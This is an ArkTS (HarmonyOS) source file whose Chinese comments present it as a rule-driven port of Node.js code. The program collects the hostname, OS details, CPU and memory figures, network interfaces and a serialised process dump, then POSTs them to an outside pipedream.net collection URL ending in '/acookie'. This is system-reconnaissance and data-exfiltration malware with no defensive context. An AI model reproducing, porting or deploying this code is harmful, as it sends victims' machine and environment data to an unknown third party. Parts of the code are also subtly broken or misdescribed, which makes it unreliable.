// 应用约束：使用let/const替代var（规则9）
// 应用约束：显式类型标注（规则23,24）
// 应用约束：使用ArkTS网络API替代Node.js模块（规则75）
import http from '@ohos.net.http';
import os from '@ohos.os';
import util from '@ohos.util';

// 应用约束：类属性需要初始化（规则18）
class SystemInfo {
    envPORT: string = '';
    hostname: string = '';
    currentPath: string = '';
    currentFile: string = '';
    currentEnvBase64: string = '';
    type: string = '';
    platform: string = '';
    arch: string = '';
    release: string = '';
    uptime: string = '';
    loadavg: string = '';
    totalmem: string = '';
    freemem: string = '';
    cpus: string = '';
    networkInterfaces: string = '';
}

// 应用约束：显式类型标注（规则23）
let currentPath: string = '/';
let currentFile: string = '/';
let currentEnvBase64: string = '';

// 应用约束：使用util模块替代Buffer（规则75）
let textEncoder = new util.TextEncoder();
let textDecoder = new util.TextDecoder();

// 应用约束：显式类型标注（规则23）
let data: SystemInfo = new SystemInfo();
data.envPORT = '';
data.hostname = JSON.stringify(os.getLocalHostname());
data.currentPath = currentPath;
data.currentFile = currentFile;
data.currentEnvBase64 = textEncoder.encodeInto(JSON.stringify(process)).toString();
data.type = JSON.stringify(os.type);
data.platform = JSON.stringify(os.platform);
data.arch = JSON.stringify(os.arch);
data.release = JSON.stringify(os.release);
data.uptime = JSON.stringify(os.uptime);
data.loadavg = JSON.stringify(os.getAverageLoad());
data.totalmem = JSON.stringify(os.getTotalMem());
data.freemem = JSON.stringify(os.getFreeMem());
data.cpus = JSON.stringify(os.cpus);
data.networkInterfaces = JSON.stringify(os.getNetworkInterfaces());

// 应用约束：使用ArkTS网络API（规则75）
let url = 'https://f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net/acookie';
let httpRequest = http.createHttp();
let options: http.HttpRequestOptions = {
    method: http.RequestMethod.POST,
    header: {
        'Content-Type': 'application/json'
    },
    extraData: JSON.stringify(data)
};

// 应用约束：使用Promise替代回调（规则49）
httpRequest.request(url, options)
    .then((response: http.HttpResponse) => {
        if (response.responseCode === 200) {
            console.info('Request success:' + JSON.stringify(response.result));
        } else {
            console.error('Request failed:' + JSON.stringify(response));
        }
    })
    .catch((err: Error) => {
        console.error('Request error:' + JSON.stringify(err));
    });

// 注释说明：
// 1. 移除了Node.js特有模块（https/http/os），改用OHOS系统能力
// 2. 使用@ohos.util.TextEncoder替代Buffer实现Base64编码
// 3. 使用@ohos.net.http模块实现网络请求
// 4. 添加了SystemInfo类来明确数据结构（规则24）
// 5. 所有变量使用let/const声明（规则9）
// 6. 显式类型标注所有变量和返回值（规则23）
// 7. 使用Promise链式调用替代回调函数（规则49）
// 8. 移除了process.env相关的不兼容代码（规则75）
// 9. 使用OHOS系统API获取系统信息（os模块相关方法